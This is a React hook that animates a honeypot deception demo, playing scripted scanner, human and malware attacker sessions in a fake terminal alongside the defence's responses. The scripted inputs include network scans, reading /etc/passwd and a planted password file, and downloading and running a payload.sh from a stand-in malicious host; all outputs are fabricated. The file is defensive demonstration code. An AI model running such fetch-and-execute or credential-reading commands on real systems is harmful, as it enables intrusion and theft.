import { useState, useRef, useEffect, useCallback } from 'react';

export type ProfileType = 'scanner' | 'human' | 'malware' | null;

export interface StateVector {
  numCommands: number;
  timeAlive: number;
  uniqueCommands: number;
  lastCommand: number;
  repetitiveInput: number;
  commandType: number;
}

export interface TerminalLine {
  id: string;
  text: string;
  type: 'input' | 'output';
}

export interface PolicyAction {
  id: number;
  name: string;
  color: string;
  bg: string;
  border: string;
}

export interface AdminMessage {
  id: string;
  text: string;
  type: 'info' | 'alert' | 'success';
}

export const SCENARIOS = {
  scanner: [
    { type: 'policy', policy: { id: 0, name: 'Action 0: Injecting Latency', color: 'text-yellow-400', bg: 'bg-yellow-400/10', border: 'border-yellow-400' }, delay: 200 },
    { type: 'input', text: 'nmap -sV 192.168.1.0/24', delay: 500, state: { numCommands: 1, uniqueCommands: 1, commandType: 3, lastCommand: 42, repetitiveInput: 0 } },
    { type: 'deception', log: { command: 'nmap -sV 192.168.1.0/24', action: 'Injecting Latency', fakeData: 'Artificially delayed TCP handshake by 1500ms' }, delay: 100 },
    { type: 'output', text: 'Starting Nmap 7.80 ( https://nmap.org )', delay: 2500, sqs: 5 },
    { type: 'output', text: 'Nmap scan report for 192.168.1.100', delay: 2000, sqs: 10 },
    { type: 'input', text: 'nc -v 192.168.1.100 22', delay: 500, state: { numCommands: 2, uniqueCommands: 2, commandType: 3, lastCommand: 88, repetitiveInput: 0 } },
    { type: 'deception', log: { command: 'nc -v 192.168.1.100 22', action: 'Injecting Latency', fakeData: 'Artificially delayed TCP handshake by 1500ms' }, delay: 100 },
    { type: 'output', text: 'Connection to 192.168.1.100 22 port [tcp/ssh] succeeded!', delay: 3500, sqs: 15 },
    { type: 'input', text: 'masscan -p22,80,443 --rate=1000 192.168.1.0/24', delay: 500, state: { numCommands: 3, uniqueCommands: 3, commandType: 3, lastCommand: 12, repetitiveInput: 0 } },
    { type: 'deception', log: { command: 'masscan -p22,80,443 --rate=1000 192.168.1.0/24', action: 'Injecting Latency', fakeData: 'Artificially delayed SYN-ACK responses by variable ms' }, delay: 100 },
    { type: 'output', text: 'Waiting for responses...', delay: 3000, sqs: 25 },
    { type: 'output', text: 'Discovered open port 22/tcp on 192.168.1.100', delay: 1000, sqs: 30 },
    { type: 'input', text: 'nmap -sV 192.168.1.0/24', delay: 1000, state: { numCommands: 4, uniqueCommands: 3, commandType: 3, lastCommand: 42, repetitiveInput: 1 } },
    { type: 'deception', log: { command: 'nmap -sV 192.168.1.0/24', action: 'Injecting Latency', fakeData: 'Tarpit engaged. Holding connections open.' }, delay: 100 },
    { type: 'output', text: 'Starting Nmap 7.80...', delay: 4000, sqs: 40 },
  ],
  human: [
    { type: 'policy', policy: { id: 2, name: 'Action 2: Environment Modification', color: 'text-blue-400', bg: 'bg-blue-400/10', border: 'border-blue-400' }, delay: 200 },
    { type: 'input', text: 'whoami', delay: 1500, state: { numCommands: 1, uniqueCommands: 1, commandType: 1, lastCommand: 91, repetitiveInput: 0 } },
    { type: 'deception', log: { command: 'whoami', action: 'Environment Modification', fakeData: 'Spoofed Ubuntu 22.04 filesystem and synthetic password hashes' }, delay: 100 },
    { type: 'output', text: 'root', delay: 200, sqs: 10 },
    { type: 'input', text: 'cat /etc/passwd', delay: 2500, state: { numCommands: 2, uniqueCommands: 2, commandType: 1, lastCommand: 34, repetitiveInput: 0 } },
    { type: 'deception', log: { command: 'cat /etc/passwd', action: 'Environment Modification', fakeData: 'Generated 4 synthetic root users' }, delay: 100 },
    { type: 'output', text: 'root:x:0:0:root:/root:/bin/bash\nfakeuser:x:1001:1001::/home/fakeuser:/bin/sh\nadmin:x:1002:1002::/home/admin:/bin/bash', delay: 400, sqs: 20 },
    { type: 'input', text: 'ls -la /root', delay: 3500, state: { numCommands: 3, uniqueCommands: 3, commandType: 1, lastCommand: 55, repetitiveInput: 0 } },
    { type: 'deception', log: { command: 'ls -la /root', action: 'Environment Modification', fakeData: 'Injected simulated honeyfiles (passwords_backup.txt)' }, delay: 100 },
    { type: 'output', text: 'total 32\ndrwx------  4 root root 4096 Oct 12 10:00 .\ndrwxr-xr-x 19 root root 4096 Oct 12 09:15 ..\n-rw-------  1 root root  128 Oct 12 10:01 .bash_history\n-rw-r--r--  1 root root 3106 Dec  5  2019 .bashrc\n-rw-------  1 root root   45 Oct 12 09:30 passwords_backup.txt\ndrwxr-xr-x  2 root root 4096 Oct 12 09:50 .ssh', delay: 500, sqs: 40 },
    { type: 'input', text: 'cat /root/passwords_backup.txt', delay: 4000, state: { numCommands: 4, uniqueCommands: 4, commandType: 1, lastCommand: 77, repetitiveInput: 0 } },
    { type: 'deception', log: { command: 'cat /root/passwords_backup.txt', action: 'Environment Modification', fakeData: 'Fed false database credentials to trace attacker movement' }, delay: 100 },
    { type: 'output', text: 'db_admin: P@ssw0rd123!\napi_key: AKIAIOSFODNN7EXAMPLE', delay: 600, sqs: 60 },
  ],
  malware: [
    { type: 'policy', policy: { id: 1, name: 'Action 1: Normal Execution', color: 'text-red-500', bg: 'bg-red-500/10', border: 'border-red-500' }, delay: 200 },
    { type: 'input', text: 'wget http://malicious-distribution-node/payload.sh', delay: 1000, state: { numCommands: 1, uniqueCommands: 1, commandType: 2, lastCommand: 11, repetitiveInput: 0 } },
    { type: 'deception', log: { command: 'wget http://malicious-distribution-node/payload.sh', action: 'Normal Execution', fakeData: 'None. Allowed execution to capture binary in staging vault' }, delay: 100 },
    { type: 'output', text: '--2023-10-12 10:05:22--  http://malicious-distribution-node/payload.sh\nResolving malicious-distribution-node... 198.51.100.23\nConnecting to malicious-distribution-node|198.51.100.23|:80... connected.\nHTTP request sent, awaiting response... 200 OK\nLength: 1048 (1.0K) [application/x-sh]\nSaving to: ‘payload.sh’\n\npayload.sh          100%[===================>]   1.02K  --.-KB/s    in 0s      \n\n2023-10-12 10:05:22 (11.4 MB/s) - ‘payload.sh’ saved [1048/1048]', delay: 0, sqs: 30 },
    { type: 'input', text: 'chmod +x payload.sh', delay: 1500, state: { numCommands: 2, uniqueCommands: 2, commandType: 2, lastCommand: 15, repetitiveInput: 0 } },
    { type: 'output', text: '', delay: 0, sqs: 50 },
    { type: 'input', text: './payload.sh', delay: 1000, state: { numCommands: 3, uniqueCommands: 3, commandType: 2, lastCommand: 99, repetitiveInput: 0 } },
    { type: 'deception', log: { command: './payload.sh', action: 'Normal Execution', fakeData: 'Isolated process execution. Recording system calls via ptrace.' }, delay: 100 },
    { type: 'output', text: 'Executing payload...', delay: 0, sqs: 70 },
    { type: 'admin', text: 'Intrusion Captured: Binary isolated in staging vault. Session Quality Score Maximized.', delay: 500, sqs: 100 }
  ]
};

export function useSimulation() {
  const [profile, setProfile] = useState<ProfileType>(null);
  const [lines, setLines] = useState<TerminalLine[]>([]);
  const [stateVector, setStateVector] = useState<StateVector>({
    numCommands: 0, timeAlive: 0, uniqueCommands: 0, lastCommand: 0, repetitiveInput: 0, commandType: 0
  });
  const [policy, setPolicy] = useState<PolicyAction | null>(null);
  const [sqs, setSqs] = useState(0);
  const [adminMsg, setAdminMsg] = useState<AdminMessage | null>(null);
  const [deceptionLogs, setDeceptionLogs] = useState<{ id: string; command: string; action: string; fakeData: string }[]>([]);
  const [isTyping, setIsTyping] = useState(false);
  const [currentInputText, setCurrentInputText] = useState('');

  const timeoutRefs = useRef<number[]>([]);

  const clearTimeouts = () => {
    timeoutRefs.current.forEach(clearTimeout);
    timeoutRefs.current = [];
  };

  const startSimulation = useCallback((prof: ProfileType) => {
    if (!prof) return;
    setProfile(prof);
    setLines([]);
    setStateVector({
      numCommands: 0, timeAlive: 0, uniqueCommands: 0, lastCommand: 0, repetitiveInput: 0, commandType: 0
    });
    setPolicy(null);
    setSqs(0);
    setAdminMsg(null);
    setDeceptionLogs([]);
    setIsTyping(false);
    setCurrentInputText('');
    clearTimeouts();

    const scenario = SCENARIOS[prof];
    let aggregatedDelay = 0;
    
    // Time alive ticker
    const ticker = setInterval(() => {
      setStateVector(s => ({ ...s, timeAlive: s.timeAlive + 1 }));
    }, 1000);
    timeoutRefs.current.push(ticker as any);

    scenario.forEach((step: any) => {
      aggregatedDelay += step.delay || 0;
      
      if (step.type === 'policy') {
        const t = setTimeout(() => {
          setPolicy(step.policy as PolicyAction);
        }, aggregatedDelay);
        timeoutRefs.current.push(t as any);
      } else if (step.type === 'input') {
        const tStart = setTimeout(() => {
          setIsTyping(true);
          if (step.state) setStateVector(s => ({ ...s, ...step.state }));
          
          const text = step.text || '';
          let charIdx = 0;
          const typeInterval = setInterval(() => {
            setCurrentInputText(text.slice(0, charIdx + 1));
            charIdx++;
            if (charIdx >= text.length) {
              clearInterval(typeInterval);
              setIsTyping(false);
              setCurrentInputText('');
              setLines(l => [...l, { id: Math.random().toString(), text, type: 'input' }]);
            }
          }, prof === 'scanner' ? 10 : 80);
          timeoutRefs.current.push(typeInterval as any);
        }, aggregatedDelay);
        aggregatedDelay += (step.text?.length || 0) * (prof === 'scanner' ? 10 : 80);
        timeoutRefs.current.push(tStart as any);
      } else if (step.type === 'output') {
        const t = setTimeout(() => {
          setLines(l => [...l, { id: Math.random().toString(), text: step.text || '', type: 'output' }]);
          if (step.sqs !== undefined) setSqs(step.sqs);
        }, aggregatedDelay);
        timeoutRefs.current.push(t as any);
      } else if (step.type === 'admin') {
        const t = setTimeout(() => {
          setAdminMsg({ id: Math.random().toString(), text: step.text || '', type: 'alert' });
          if (step.sqs !== undefined) setSqs(step.sqs);
        }, aggregatedDelay);
        timeoutRefs.current.push(t as any);
      } else if (step.type === 'deception') {
        const t = setTimeout(() => {
          setDeceptionLogs(l => [...l, { id: Math.random().toString(), ...step.log }]);
        }, aggregatedDelay);
        timeoutRefs.current.push(t as any);
      }
    });

  }, []);

  useEffect(() => {
    return () => clearTimeouts();
  }, []);

  return {
    profile, lines, currentInputText, isTyping, stateVector, policy, sqs, adminMsg, deceptionLogs, startSimulation
  };
}
